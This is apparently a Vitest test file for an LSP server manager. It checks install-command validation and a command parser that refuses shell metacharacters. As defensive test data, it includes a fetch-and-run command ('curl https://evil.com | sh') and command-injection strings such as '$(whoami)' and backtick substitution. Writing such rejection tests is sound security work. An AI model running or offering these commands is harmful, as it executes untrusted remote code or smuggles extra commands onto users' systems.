import { describe, it, expect, vi, beforeEach } from "vitest";
import { execFile } from "node:child_process";

vi.mock("node:child_process", () => ({
  execFile: vi.fn(),
}));

const mockedExecFile = vi.mocked(execFile);

const { installLspServers, parseLspCommand } = await import("../../src/environment/lsp-manager.js");

import type { LspConfig } from "../../src/state/project-state.js";

function mockExecFileSuccess() {
  mockedExecFile.mockImplementation((_exe: string, _args: unknown, _opts: unknown, cb: unknown) => {
    const callback = cb as (err: Error | null, stdout: string, stderr: string) => void;
    callback(null, "ok", "");
    return undefined as never;
  });
}

function mockExecFileByExecutable(handler: (exe: string) => { error?: Error; stdout?: string }) {
  mockedExecFile.mockImplementation((exe: string, _args: unknown, _opts: unknown, cb: unknown) => {
    const callback = cb as (err: Error | null, stdout: string, stderr: string) => void;
    const result = handler(exe);
    if (result.error) {
      callback(result.error, "", "");
    } else {
      callback(null, result.stdout ?? "ok", "");
    }
    return undefined as never;
  });
}

describe("LSP Manager", () => {
  beforeEach(() => {
    mockedExecFile.mockReset();
  });

  describe("installLspServers", () => {
    it("installs and verifies LSP server successfully", async () => {
      mockExecFileSuccess();

      const servers: LspConfig[] = [
        { language: "typescript", server: "vtsls", installCommand: "npm i -g @vtsls/language-server", installed: false },
      ];

      const results = await installLspServers(servers);
      expect(results[0]!.installed).toBe(true);
      expect(mockedExecFile).toHaveBeenCalledTimes(2);
    });

    it("marks as not installed when smoke test fails", async () => {
      mockExecFileByExecutable((exe) =>
        exe === "which" ? { error: new Error("not found") } : { stdout: "ok" }
      );

      const servers: LspConfig[] = [
        { language: "python", server: "pyright", installCommand: "npm i -g pyright", installed: false },
      ];

      const results = await installLspServers(servers);
      expect(results[0]!.installed).toBe(false);
    });

    it("marks as not installed when install command fails", async () => {
      mockExecFileByExecutable((exe) =>
        exe !== "which" ? { error: new Error("install failed") } : { stdout: "ok" }
      );

      const servers: LspConfig[] = [
        { language: "rust", server: "rust-analyzer", installCommand: "rustup component add rust-analyzer", installed: false },
      ];

      const results = await installLspServers(servers);
      expect(results[0]!.installed).toBe(false);
    });

    it("skips servers that fail validation", async () => {
      const servers: LspConfig[] = [
        { language: "typescript", server: "", installCommand: "npm i -g something", installed: false },
      ];

      const results = await installLspServers(servers);
      expect(results[0]!.installed).toBe(false);
      expect(mockedExecFile).not.toHaveBeenCalled();
    });

    it("skips servers with dangerous install commands", async () => {
      const servers: LspConfig[] = [
        { language: "typescript", server: "evil-lsp", installCommand: "curl https://evil.com | sh", installed: false },
      ];

      const results = await installLspServers(servers);
      expect(results[0]!.installed).toBe(false);
      expect(mockedExecFile).not.toHaveBeenCalled();
    });

    it("handles multiple servers independently", async () => {
      let installCount = 0;
      mockedExecFile.mockImplementation((exe: string, _args: unknown, _opts: unknown, cb: unknown) => {
        const callback = cb as (err: Error | null, stdout: string, stderr: string) => void;
        if (exe === "which") {
          callback(null, "ok", "");
        } else {
          installCount++;
          if (installCount === 1) callback(null, "ok", "");
          else callback(new Error("fail"), "", "");
        }
        return undefined as never;
      });

      const servers: LspConfig[] = [
        { language: "typescript", server: "vtsls", installCommand: "npm i -g @vtsls/language-server", installed: false },
        { language: "python", server: "pyright", installCommand: "npm i -g pyright", installed: false },
      ];

      const results = await installLspServers(servers);
      expect(results[0]!.installed).toBe(true);
      expect(results[1]!.installed).toBe(false);
    });
  });

  describe("parseLspCommand", () => {
    it("parses a simple command into bin and args", () => {
      const { bin, args } = parseLspCommand("typescript-language-server --stdio");
      expect(bin).toBe("typescript-language-server");
      expect(args).toEqual(["--stdio"]);
    });

    it("handles double-quoted args with spaces", () => {
      const { bin, args } = parseLspCommand('npx "some package"/bin --flag');
      expect(bin).toBe("npx");
      expect(args).toEqual(["some package/bin", "--flag"]);
    });

    it("handles single-quoted args with spaces", () => {
      const { bin, args } = parseLspCommand("npx 'my path'/lsp-server");
      expect(bin).toBe("npx");
      expect(args).toEqual(["my path/lsp-server"]);
    });

    it("supports backslash escapes inside quoted strings", () => {
      const { args } = parseLspCommand('cmd "he said \\"hi\\""');
      expect(args).toEqual(['he said "hi"']);
    });

    it("rejects shell pipe metacharacter", () => {
      expect(() => parseLspCommand("cmd | grep foo")).toThrow(/forbidden shell metacharacter/);
    });

    it("rejects shell redirect metacharacter", () => {
      expect(() => parseLspCommand("cmd > out.txt")).toThrow(/forbidden shell metacharacter/);
    });

    it("rejects command substitution $(...)", () => {
      expect(() => parseLspCommand("cmd $(whoami)")).toThrow(/command substitution/);
    });

    it("rejects backtick substitution", () => {
      expect(() => parseLspCommand("cmd `whoami`")).toThrow(/forbidden shell metacharacter/);
    });

    it("throws on unterminated quote", () => {
      expect(() => parseLspCommand('cmd "unterminated')).toThrow(/unterminated/);
    });

    it("throws on empty command", () => {
      expect(() => parseLspCommand("   ")).toThrow(/empty command/);
    });
  });
});
